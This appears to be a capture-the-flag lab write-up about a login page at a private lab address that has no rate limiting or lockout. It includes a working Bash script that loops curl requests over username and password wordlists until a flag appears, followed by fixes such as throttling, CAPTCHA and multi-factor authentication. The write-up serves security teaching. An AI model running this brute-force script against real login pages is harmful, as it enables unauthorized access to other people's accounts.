#  Brute-force Attack on Login Page

##  Description

The login page located at `http://192.168.56.106/?page=signin` is vulnerable to a brute-force attack. No rate-limiting or account lockout mechanisms are in place, allowing an attacker to automate login attempts using common usernames and passwords. A successful login reveals a flag in the response, indicating a security flaw.

##  Steps to Reproduce

1. Prepare two wordlists:
   - git@github.com:duyet/bruteforce-database.git
   - A list of common usernames (e.g. `38650-username-sktorrent.txt`)
   - A list of common passwords (e.g. `10k-most-common.txt`)

2. Use the following Bash script to automate the brute-force attack:

   ```bash
   URL="http://192.168.56.106/?page=signin"
   USERFILE="38650-username-sktorrent.txt"
   PASSFILE="1000000-password-seclists.txt"

   while read -r username; do
     while read -r password; do
       response=$(curl -s "$URL&username=$username&password=$password&Login=Login#")

       echo "$response" | grep -q "flag"
       if [ $? -eq 0 ]; then
         echo "TROUVÉ : $username / $password"
         echo
         echo "Contenu de la réponse :"
         echo "$response"
         exit 0
       fi
     done < "$PASSFILE"
   done < "$USERFILE"

   echo "pas de correspondance"
   ```

3. Run the script:
   ```bash
   chmod +x bruteforce.sh
   ./bruteforce.sh
   ```

4. The script will display the correct credentials and the response containing the flag when a match is found.

## ️ Risks

- **Brute-force vulnerability**: An attacker can guess credentials by automating thousands of login attempts without any limitation.

- **Sensitive data exposure**: Logged-in users may access confidential information such as flags, internal messages, or user records.
- **Lack of security defenses**: No CAPTCHA, rate-limiting, or IP blocking means attackers can run automated scripts freely.


##  Recommended Fix

- **Implement rate-limiting** on login attempts per IP to prevent rapid-fire brute-force attacks.
- **Introduce account lockout or throttling** after several failed login attempts.
- **Enforce strong password policies** for all users, including length, complexity, and periodic rotation.
- **Add CAPTCHA** to login forms, especially after multiple failures.
- **Implement Multi-Factor Authentication** to prevent unauthorized access even with valid credentials.
- **Use generic error messages** like “Invalid credentials” instead of revealing whether the username or password is incorrect.
- **Monitor and log failed login attempts** and trigger alerts for suspicious activity.

---

